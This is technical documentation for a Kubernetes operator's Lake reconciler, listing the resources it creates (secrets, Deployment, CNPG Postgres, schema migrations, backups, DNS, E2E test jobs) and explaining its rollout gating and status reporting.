Reconciler: `internal/controller/lake_controller.go`. Full page: [`lake/README.md`](lake/README.md);
field reference: the `Lake` section of [`crd-reference.md`](crd-reference.md). This is not part of
the Orama Cloud v1 stack: it deploys `oramasearch/lake`, the hosted service of the liquid project,
and reuses this operator's CNPG, PostgresSchema and Cloudflare DNS paths.

| Creates | Name | Owned | Notes |
|---|---|---|---|
| Namespace | `spec.namespace` | no | blind Create, AlreadyExists ignored; never deleted |
| Secret | `lake-<name>-admin` | yes | admin bearer token, 64 hex, minted once |
| Secret | `lake-<name>-instance-kek` | yes | root wrapping key for lake's customer KEKs, minted once while Postgres is enabled |
| Secret | `lake-<name>-sealing-key` | yes | active and retained X25519 private keys; public recipient is published in Lake status and injected into lake |
| PersistentVolumeClaim | `spec.store.existingClaim` or `lake-<name>-store` | only the generated claim | generated once from size/class/modes and preserved across store spec changes; mounted at `/var/lib/lake/store` |
| Deployment | `lake-<name>` | yes | resource defaults or `spec.resources`; `/healthz` liveness and `/readyz` readiness; non-root uid/gid 10001; startup probe; zero-unavailable surge rollout for a ReadWriteMany store, `Recreate` for a single-replica ReadWriteOnce store unless `spec.rollout.overlapOnSharedStore` opts into a surge co-located with the running pod, and always for ReadWriteOncePod; 15 s kubelet-sleep pre-stop drain in a 45 s grace period; default or configured topology spread; store mount and `LAKE_STORE_ROOT` |
| PodDisruptionBudget | `lake-<name>` | yes | created only above one replica with `maxUnavailable: 1`; removed when scaled to one |
| Service | `lake-<name>` | yes | ClusterIP 80 → `spec.port` |
| `OramaZettaCluster` | `lake-<name>-zetta` | yes | `spec.zetta`, including `env`; carries the operator schema as the Lake's deployment control plane (operator#557); deletion completes before the Lake finalizer is released |
| CNPG `Cluster` | `lake-<name>-controldb` | yes (unstructured) | `spec.postgres`: instances, storageSize (50Gi), storageClassName; disable tears down **with data** |
| ConfigMap + `PostgresSchema` | `lake-<name>-controldb-migrations`, `-schema` | yes | `assets/lake-schema.sql` vendored from `oramasearch/lake` `db/schema.sql`; guard = the newest migration's table (`workspace_volumes_guard`, `0069_workspace_volumes`); the Job also requires every migration the file records in `schema_migrations` (#271) |
| CNPG `ScheduledBackup` | `lake-<name>-controldb-backup` | yes (unstructured) | opt-in Barman R2/S3 backup; CNPG `Backup` resources are observed by `cnpg.io/cluster` label |
| `LakeRestoreRehearsal` scratch resources | `lake-rehearsal-<name>-<hash>` | yes | temporary Namespace containing a recovered CNPG Cluster, copied credentials, and a verification Job; all are deleted after a terminal result |
| Ingress + `CloudflareDNSRecord` | `lake-<name>`, `-dns` | yes | opt-in via `ingressEnabled` + `host` + `dnsSecretRef`, optional `tls.secretName`, and Lake streaming annotations |
| `LakeE2ETest` Job | `<test-name>-e2e` in the Lake namespace | yes, by the cluster-scoped test | starts only after Lake, Postgres, and schema readiness; the required image owns signup and liquid push/pull assertions |

Lake creates or updates its Deployment and disruption budget only after the desired schema
version is Applied. An existing Deployment stays unchanged while migration is pending or failed.
Re-vendor by copying lake `db/schema.sql` unchanged, updating the pinned commit/SHA-256 and guard,
and running the byte comparison and envtest proof in [`lake/schema.md`](lake/schema.md).
The SQL-plus-guard hash replaces obsolete migration Jobs automatically, waiting for their pods
before a replacement starts. Incremental migration files remain #126.

The `LakeSealedSecret` reconciler opens literal canonical-CBOR envelopes or requests sealed static
and dynamic values from lake, then owns an output Secret labelled `lake.orama.cloud/sealed: "true"`.
It rejects an unrelated Secret at the requested name. See [`lake/sealed-secrets.md`](lake/sealed-secrets.md).

Status mirrors the Deployment, publishes the active sealing recipient and retained-key counts,
selected store claim (claim, phase, capacity, and `StoreReady`),
the CNPG cluster (polled every 20 s, not watched), the PostgresSchema, the owned Zetta cluster
(`zettaReady` and `ZettaReady`), and enabled backup completion. Overall `Ready` requires the current
Deployment generation with all desired ready, updated, and available replicas; a Bound store;
all configured Postgres instances ready and the current schema Applied when Postgres is enabled;
and the enabled Zetta child Ready. Failed schema or Deployment states report `Degraded`, while
pending work reports `Progressing`; `conditions[Ready]` explains the blocker. CNPG polling continues
after success even with backups disabled, so later readiness loss updates the phase. Unchanged
polls write zero status updates. This contract is covered by native fake-client regressions.
Production: `Lake/prod` in namespace `lake` on AKS; R2 backup credentials must exist before its backup is enabled.

`LakeE2ETest` watches the cluster-scoped Lake independently of normal reconciliation. Target changes
and a 15-second pending requeue release the test once the Deployment, Postgres, and schema are ready.
The immutable Job then drives `http://lake-<name>.<namespace>.svc.cluster.local` from its runner image
and reports `Running`, `Succeeded`, or `Failed` without rewriting an unchanged status.
